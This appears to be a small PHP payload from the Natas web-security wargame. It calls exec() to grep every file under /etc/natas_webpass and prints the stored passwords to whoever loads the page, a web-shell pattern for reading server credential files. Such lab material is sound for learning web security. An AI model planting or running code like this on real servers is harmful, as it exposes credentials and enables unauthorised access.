<?php
    $results = exec('grep -e ".*" -R /etc/natas_webpass');
    print($results);
?>
